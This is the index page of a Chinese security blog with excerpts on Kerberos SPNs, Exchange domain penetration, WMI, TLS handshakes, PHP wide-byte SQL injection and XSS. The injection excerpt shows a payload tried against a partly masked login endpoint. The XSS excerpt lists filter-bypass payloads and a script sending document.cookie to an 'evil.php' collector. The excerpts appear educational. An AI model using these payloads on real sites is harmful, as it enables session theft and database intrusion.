<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>ru0</title><meta name="description" content="玲珑骰子安红豆"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="ru0"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="ru0"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link active" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="/hmind" target="_self">HACKMIND</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/ru0" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><ul class="home post-list"><li class="post-list-item"><article class="post-block"><h2 class="post-title"><a class="post-title-link" href="/2017/11/01/SPNs/">SPNs</a></h2><div class="post-info"><a></a>2017-11-01</div><div class="post-content"><p>首先了解一下Kerberos认证协议</p>
<p>Kerberos Overview &amp; Communication Process:</p>
<p><img src="https://www.ibm.com/developerworks/cn/data/library/techarticles/dm-0809govindarajan/image001.gif" alt=""></p>
<p>KDC（Key Distribution Center）有两个服务组成：身份验证服务（Authentication Server，简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。</p>
<p>User logs on with username &amp; password.</p>
<p>客户端认证</p>
<ol>
<li>客户端将用户id明文消息发送到AS。</li>
<li>AS返回使用客户端用户密码加密的会话密钥session key和使用krbegt密码加密的TGT。</li>
<li>客户端使用用户密码解密消息获得会话密钥，该会话密钥用于与TGS的进一步通信。</li>
</ol>
<p>客户服务授权</p>
<ol>
<li>客户端发送TGT和用Client/TGS会话密钥加密的认证器。</li>
<li>TGS解密TGT获得会话密钥并用此密钥解密认证器，如果id匹配则返回使用服务密码加密的客户端到服务器的票据和使用Client/TGS会话密钥加密的客户端/服务器会话密钥session key2。</li>
</ol>
<p>客户服务请求</p>
<ol>
<li>客户端发送一个用session key2加密的新的Authenticator和服务票据。</li>
<li>服务器用自己密码解密服务票据并提供服务。</li>
</ol>
<h3 id="Service-Principal-Names"><a href="#Service-Principal-Names" class="headerlink" title="Service Principal Names"></a>Service Principal Names</h3><p>服务主体名称 (SPN) 是服务实例的唯一标识符。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。以为MSSQL服务配置SPN为例。<br><a href="https://technet.microsoft.com/zh-cn/library/bb735885.aspx" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/bb735885.aspx</a></p></div><a class="read-more" href="/2017/11/01/SPNs/">&hellip; more</a></article></li><li class="post-list-item"><article class="post-block"><h2 class="post-title"><a class="post-title-link" href="/2017/07/27/exchange server/">域渗透之Exchange Server</a></h2><div class="post-info"><a></a>2017-07-27</div><div class="post-content"><p><img src="https://i-technet.sec.s-msft.com/Areas/Epx/Themes/TechNet/Content/Images/BrandLogoExchange.png?v=636437933426396895" alt=""></p>
<blockquote>
<p>Microsoft Exchange Server 做为消息与协作系统。它提供了业界最强的扩展性、高可靠性、安全性和高处理性能，被许多企业、学校、政府等作为主要邮件系统。在内网渗透测试中，对邮件系统的把控会让你事半功倍，尤其是和AD绑在一起的Exchange。</p>
</blockquote>
<p>通过本文你将了解Ps下对Exchange邮件的基本操作，这也同样适用于运维管理，当然相比博大精深的ES是远远不够的。以下环境为Exchange server 2013，也同样适用于2010等版本。</p>
<p>你可以在开始菜单中通过 Exchange Management Shell （EMS）管理器快捷方式连接到 exchange server，初始化过后你将得到一个Powershell命令窗口。如果连接失败，请相信我，一定是你内存分配的不够，默认安装的Exchange也至少需要分配6个G内存。</p>
<p>如果一切都没有问题，并且你已经获取了域控权限，那就开始我们的旅程吧！</p></div><a class="read-more" href="/2017/07/27/exchange server/">&hellip; more</a></article></li><li class="post-list-item"><article class="post-block"><h2 class="post-title"><a class="post-title-link" href="/2017/02/08/WMI/">WMI</a></h2><div class="post-info"><a></a>2017-02-08</div><div class="post-content"><h3 id="WMI-管理规范"><a href="#WMI-管理规范" class="headerlink" title="WMI 管理规范"></a>WMI 管理规范</h3><p>术语</p>
<ul>
<li>CIM - Common Information Model – this is the premier concept of WBEM by this model WMI stores the Managed objects data (namespace, classes, methods, properties etc.).  </li>
<li>CIM Repository – This is the storage that holds the Managed objects data. The structure of the CIM repository is build upon the DMTF.  </li>
<li>CIMOM - Common Information Model object manager. The CIM repository is managed by the CIMOM, which acts as an agent for object requests. The CIMOM tracks available classes and determines which provider is responsible for supplying instances of these classes..  </li>
<li>DMTF - Distributed Management Task Force – The DMTF consortium was founded in May of 1992. This initiative was conceived and created by eight companies like: BMC Software Inc., Cisco Systems Inc., Compaq Computer Corp., Intel Corp., and Microsoft Corp. etc. The aims of this consortium are to define industry standards for management.</li>
<li>MIB – Management Information Base describes a set of managed objects. Each managed object in a MIB has a unique identifier.</li>
<li>MOF - Managed Object Format. This text file includes the class definition of on or more managed object. You can export and import this definition from the CIM repository by using the WMI CIM Studio.</li>
<li>Schema - a group of classes that describe a particular management environment.</li>
<li>SNMP - Simple Network Management Protocol. SNMP is an Internet standard defined by the IETF and is a part of TCP/IP suite of protocols. SNMP is the protocol by which managed information is travel between stations and agents. Management information refers to a collection of managed objects that reside in a virtual information store called a Management Information Base (MIB).</li>
<li>WBEM - Web-Based Enterprise Management – WBEM stands for several DMTF industry standards including the Common Information Model. WBEM provides a standardized way to access information from various hardware and software management systems in an enterprise environment.  </li>
</ul>
<p>协议</p>
<p>DCOM TCP Port 135<br>WinRM TCP Ports 5985 (HTTP) and 5986 (HTTPS).<br>服务 Winmgmt </p></div><a class="read-more" href="/2017/02/08/WMI/">&hellip; more</a></article></li><li class="post-list-item"><article class="post-block"><h2 class="post-title"><a class="post-title-link" href="/2015/07/04/PHP宽字节报错注入/">PHP宽字节报错注入</a></h2><div class="post-info"><a></a>2015-07-04</div><div class="post-content"><h4 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h4><p>注入点<br>POST <a href="http://211.137.*.*/logincheck.php" target="_blank" rel="external">http://211.137.*.*/logincheck.php</a><br>PASSWORD=1111&amp;UNAME=admin</p>
<h5 id="TESTING01-发现宽字节注入"><a href="#TESTING01-发现宽字节注入" class="headerlink" title="TESTING01 发现宽字节注入"></a>TESTING01 发现宽字节注入</h5><p><code>PASSWORD=1111&amp;UNAME=1%bf&#39;</code></p>
<p>#1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1縗’’’ at line 1<br>SQL语句: <code>SELECT * from USER where USER_ID=&#39;1縗&#39;&#39; or BYNAME=&#39;1縗&#39;&#39;</code><br>文件: D:/myoa/webroot/logincheck.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Note</div><div class="line">为了阻止SQL注入，php引入了magic_quotes_gpc，当打开时会对单引号，双引号，反斜线和 NULL字符自动转义。但是当数据库是GBK编码，就会导致宽字节注入。</div><div class="line">转义引号\&apos;</div><div class="line">PASSWORD=123456&amp;UNAME=admin%bf\&apos;</div><div class="line"> ---------------------</div><div class="line">|\ ==&gt; %5C            |</div><div class="line">|当 %bf5c会解码成 縗  |</div><div class="line"> ---------------------</div></pre></td></tr></table></figure></div><a class="read-more" href="/2015/07/04/PHP宽字节报错注入/">&hellip; more</a></article></li><li class="post-list-item"><article class="post-block"><h2 class="post-title"><a class="post-title-link" href="/2015/04/08/SSL/">SSL协议</a></h2><div class="post-info"><a></a>2015-04-08</div><div class="post-content"><p>SSL (Secure Socket Layer)安全套接字层协议<br>    TLS (Transport Layer Security)传输层安全协议</p>
<p><img src="https://blog.cloudflare.com/content/images/2014/Sep/keyless-comic-v1.gif" alt=""></p>
<p>第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。<br>第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。<br>第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster secret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。<br>第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。<br>第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成”对话密钥”（session key），用来加密接下来的整个对话过程。</p>
<p><img src="https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_rsa.jpg" alt=""></p>
<p>Tip:<br>1，生成对话密钥一共需要三个随机数，第三个发出的随机数是用服务端公钥加密的，除了客户端知道和服务端能解密出来外其他人不知道。<br>2，握手之后的对话使用”对话密钥”加密（对称加密），服务器的公钥和私钥只用于加密和解密”premaster secret”（非对称加密），无其他作用。<br>3，服务器公钥放在服务器的数字证书之中。</p>
<p>Diffie-Hellman</p>
<p><img src="https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_diffie_hellman.jpg" alt=""></p>
<p>curl -k <a href="https://www.baidu.com/img/baidu_jgylogo3.gif" target="_blank" rel="external">https://www.baidu.com/img/baidu_jgylogo3.gif</a></p>
<p>Wireshark</p>
<p>192.168.1.5    180.97.33.107 SSL Client Hello<br>180.97.33.107    192.168.1.5    TLSv1.2        Server Hello<br>180.97.33.107    192.168.1.5    TLSv1.2        Certificate, Server Key Exchange（服务端DH参数）, Server Hello Done<br>192.168.1.5    180.97.33.107    TLSv1.2     Client Key Exchange（客户端DH参数）, Change Cipher Spec, Encrypted Handshake Message<br>180.97.33.107    192.168.1.5    TLSv1.2        Change Cipher Spec, Encrypted Handshake Message</p>
<p>Curl -v 显示交互过程</p>
<p>* TLSv1.2 (OUT), TLS handshake, Client hello (1):<br>* TLSv1.2 (IN), TLS handshake, Server hello (2):<br>* NPN, negotiated HTTP1.1<br>* TLSv1.2 (IN), TLS handshake, Certificate (11):<br>* TLSv1.2 (IN), TLS handshake, Server key exchange (12):<br>* TLSv1.2 (IN), TLS handshake, Server finished (14):<br>* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):<br>* TLSv1.2 (OUT), TLS change cipher, Client hello (1):<br>* TLSv1.2 (OUT), TLS handshake, Unknown (67):<br>* TLSv1.2 (OUT), TLS handshake, Finished (20):<br>* TLSv1.2 (IN), TLS change cipher, Client hello (1):<br>* TLSv1.2 (IN), TLS handshake, Finished (20):<br>* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256</p></div><a class="read-more" href="/2015/04/08/SSL/">&hellip; more</a></article></li><li class="post-list-item"><article class="post-block"><h2 class="post-title"><a class="post-title-link" href="/2015/04/08/XSS/">XSS</a></h2><div class="post-info"><a></a>2015-04-08</div><div class="post-content"><h1 id="Cross-site-Scripting-XSS-跨站脚本"><a href="#Cross-site-Scripting-XSS-跨站脚本" class="headerlink" title="Cross-site Scripting (XSS) 跨站脚本"></a>Cross-site Scripting (XSS) 跨站脚本</h1><p>恶意代码注入</p>
<h4 id="XSS-using-Script-in-Attributes"><a href="#XSS-using-Script-in-Attributes" class="headerlink" title="XSS using Script in Attributes"></a>XSS using Script in Attributes</h4><p>XSS attacks may be conducted without using <script></script> tags. Other tags will do exactly the same thing, for example:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span></div></pre></td></tr></table></figure></p>
<p>or other attributes like: onmouseover, onerror.<br>onmouseover<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>onerror<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h4 id="XSS-using-Script-Via-Encoded-URI-Schemes"><a href="#XSS-using-Script-Via-Encoded-URI-Schemes" class="headerlink" title="XSS using Script Via Encoded URI Schemes"></a>XSS using Script Via Encoded URI Schemes</h4><p>使用编码绕过过滤 如:a=&amp;#X41 (UTF-8)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">j&amp;#X41vascript:alert(</span>'<span class="attr">test2</span>')&gt;</span></div></pre></td></tr></table></figure></p>
<h4 id="XSS-using-code-encoding"><a href="#XSS-using-code-encoding" class="headerlink" title="XSS using code encoding"></a>XSS using code encoding</h4><p>We may encode our script in base64 and place it in META tag.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>伪协议<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>获取用户cookies</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">var adr = '../evil.php?cakemonster=' + escape(document.cookie);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></div></pre></td></tr></table></figure></div><a class="read-more" href="/2015/04/08/XSS/">&hellip; more</a></article></li></ul></main><footer><div class="paginator"></div><div class="copyright"><p>&copy; 2017 <a href="http://ruos.org">ruo</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>